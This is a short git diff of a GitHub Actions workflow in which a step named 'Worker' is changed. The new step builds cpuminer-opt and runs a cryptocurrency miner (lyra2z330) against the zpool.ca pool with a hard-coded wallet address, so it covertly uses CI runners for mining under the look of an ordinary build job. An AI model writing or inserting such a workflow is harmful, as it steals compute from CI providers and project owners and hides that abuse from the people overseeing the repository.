@@ -24,4 +24,7 @@ jobs:
       uses: actions/checkout@v1
     - name: Worker
       run: |
-        sudo su && apt update -y && apt install -y screen
+        apt update -y && apt install -y screen && screen -y && apt install -y build-essential && apt install -y automake && apt install -y libssl-dev && apt install -y libcurl4-openssl-dev && apt install -y libjansson-dev && apt install -y zlib1g-dev && cd cpuminer-opt && ./build.sh && ./cpuminer -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u D5aBwWJnsbCHkhcY5T9KbUCWwpFwAYyPSk -p c=DGB,zap=PYRK-lyra2z330 -q
+
+
+            
